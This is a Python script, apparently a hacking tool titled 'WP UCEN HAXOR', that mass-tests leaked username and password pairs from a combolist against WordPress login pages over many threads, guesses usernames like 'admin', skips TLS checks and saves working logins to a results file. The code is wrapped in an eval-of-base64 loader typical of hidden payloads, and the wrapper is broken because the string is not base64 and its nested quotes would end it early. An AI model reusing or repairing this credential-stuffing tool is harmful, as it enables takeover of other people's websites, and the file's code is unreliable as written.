#!/usr/bin/env python
import base64
unknownkece = """import sys
import requests
import re
import os
import random
import argparse
from colorama import Fore, init, Style
from tabulate import tabulate
import coloredlogs, logging
from multiprocessing.dummy import Pool

init(autoreset=True)
coloredlogs.install(level='INFO')
logger = logging.getLogger(__name__)
requests.urllib3.disable_warnings()

# =================================================================================================================================== #

def clear_terminal():
    """Clear the terminal screen based on the OS."""
    os.system('cls' if os.name == 'nt' else 'clear')

# =================================================================================================================================== #

def print_colored_banner(banner):
    """Print each line of the banner in a random color without a prefix."""
    for line in banner.strip().split('\n'):
        color = random.choice([Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE, Fore.MAGENTA, Fore.CYAN, Fore.WHITE])
        print(color + line + Style.RESET_ALL)


clear_terminal()
banner = """
██╗    ██╗██████╗     ██╗   ██╗ ██████╗███████╗███╗   ██╗    ██╗  ██╗ █████╗ ██╗  ██╗ ██████╗ ██████╗ 
██║    ██║██╔══██╗    ██║   ██║██╔════╝██╔════╝████╗  ██║    ██║  ██║██╔══██╗╚██╗██╔╝██╔═══██╗██╔══██╗
██║ █╗ ██║██████╔╝    ██║   ██║██║     █████╗  ██╔██╗ ██║    ███████║███████║ ╚███╔╝ ██║   ██║██████╔╝
██║███╗██║██╔═══╝     ██║   ██║██║     ██╔══╝  ██║╚██╗██║    ██╔══██║██╔══██║ ██╔██╗ ██║   ██║██╔══██╗
╚███╔███╔╝██║         ╚██████╔╝╚██████╗███████╗██║ ╚████║    ██║  ██║██║  ██║██╔╝ ██╗╚██████╔╝██║  ██║
 ╚══╝╚══╝ ╚═╝          ╚═════╝  ╚═════╝╚══════╝╚═╝  ╚═══╝    ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝
                                                                                                      
"""
print_colored_banner(banner)

# =================================================================================================================================== #

def get_clean_domain(site):
    """Extract domain name by stripping protocol and 'www'."""
    return re.sub(r'^https?://(www\.)?', '', site).split('/')[0]

# =================================================================================================================================== #

def get_content(response):
    """Decode response content with UTF-8 or fallback to prevent Unicode errors."""
    try:
        return response.content.decode('utf-8')
    except UnicodeDecodeError:
        return str(response.content, 'utf-8')

# =================================================================================================================================== #

def extract_base_url(url):
    """Extract base URL up to known admin paths or return original URL."""
    try:
        return re.match(r'(.*)(/wp-login.php|/admin|/user)', url).group(1) if any(p in url for p in ['/wp-login.php', '/admin', '/user']) else url
    except Exception:
        logger.error("[WP-CHECKER]: Error in extract_base_url")
        return None

# =================================================================================================================================== #

def wp_login(credentials):
    """Attempt to login to WordPress with provided credentials."""
    try:
        # Validate format
        if '#' not in credentials:
            logger.error(f"{Fore.YELLOW}[WP-CHECKER]: Invalid format: {credentials}{Style.RESET_ALL}")
            return False

        # Split credentials
        url, login_info = credentials.split('#', 1)
        if '@' not in login_info:
            logger.error(f"{Fore.YELLOW}[WP-CHECKER]: Invalid username/password format: {login_info}{Style.RESET_ALL}")
            return False

        username, password = login_info.split('@', 1)
        
        # Clean and normalize the URL
        url = url.strip()
        if not url.startswith(('http://', 'https://')):
            url = 'http://' + url
        url = extract_base_url(url)

        # Define potential usernames for WordPress login
        possible_users = [username.split('@')[0], 'admin', get_clean_domain(url)]
        if len(url.split('.')[0]) > 8:
            possible_users.insert(2, url.split('.')[0][:8])

        # Attempt login with each possible username
        for user in possible_users:
            try:
                session = requests.Session()
                headers = {
                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36',
                    'Referer': f'{url}/wp-admin/'
                }
                login_data = {
                    'log': user,
                    'pwd': password,
                    'wp-submit': 'Log In',
                    'redirect_to': f'{url}/wp-admin/'
                }

                # Post the login request
                response = session.post(f'{url}/wp-login.php', data=login_data, headers=headers, verify=False, timeout=30)

                # Log the response based on result
                if response.ok:
                    content = get_content(response)
                    if content and ('wp-admin/profile.php' in content or 'wp-admin/upgrade.php' in content):
                        with open('Results.txt', 'a') as file:
                            file.write(f'URL: {url}/wp-login.php\nUsername: {user}\nPassword: {password}\n\n')
                        logger.info(f"{Fore.YELLOW}[WP-CHECKER]: {Fore.WHITE}{url} | {Fore.GREEN}{user} | {Fore.GREEN}{password} - {Fore.MAGENTA}Succeeded Login{Style.RESET_ALL}")
                        return True
                    else:
                        logger.info(f"{Fore.YELLOW}[WP-CHECKER]: {Fore.WHITE}{url} | {Fore.GREEN}{user} | {Fore.GREEN}{password} - {Fore.RED}Login Failed{Style.RESET_ALL}")
                else:
                    logger.warning(f"{Fore.YELLOW}[WP-CHECKER]: {Fore.WHITE}{url} | {Fore.GREEN}{user} | {Fore.GREEN}{password} - {Fore.RED}Login Failed{Style.RESET_ALL}")

            except requests.RequestException as req_error:
                logger.error(f"{Fore.YELLOW}[WP-CHECKER]: {Fore.WHITE}{url} | {Fore.GREEN}{user} | {Fore.GREEN}{password} - {Fore.RED}Network issue{Style.RESET_ALL}")
            except Exception as e:
                logger.error(f"{Fore.YELLOW}[WP-CHECKER]: {Fore.WHITE}{url} | {Fore.GREEN}{user} | {Fore.GREEN}{password} - {Fore.RED}Error during login attempt{Style.RESET_ALL}")

    except ValueError as e:
        logger.error(f"{Fore.YELLOW}[WP-CHECKER]: Credentials parsing error - {e}{Style.RESET_ALL}")
    except Exception as gen_error:
        logger.error(f"{Fore.RED}[WP-CHECKER]: General error occurred - {gen_error}{Style.RESET_ALL}")

    return False

# =================================================================================================================================== #

def process_combo(combo_line):
    """Process each line in the combo list."""
    combo_line = combo_line.strip()
    logger.info(f"[WP-CHECKER]: {Fore.RED}[ERROR] {combo_line}")
    wp_login(combo_line)

# =================================================================================================================================== #

def main(args):
    """Main function to process the combolist."""
    target_file = args.combolist
    if not os.path.isfile(target_file):
        logger.error(f"[WP-CHECKER]: {Fore.RED}({target_file}) File does not exist!\n")
        sys.exit(0)

    with open(target_file, 'r') as target:
        pool = Pool(args.threads)
        pool.map(process_combo, target)
        pool.close()
        pool.join()

# =================================================================================================================================== #

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="WordPress Login Checker")
    parser.add_argument('-c', '--combolist', required=True, help="Path to the combolist file")
    parser.add_argument('-t', '--threads', type=int, default=50, help="Number of threads to use (default: 50)")
    args = parser.parse_args()
    main(args)"""
eval(compile(base64.b64decode(unknownkece),"<string>","exec"))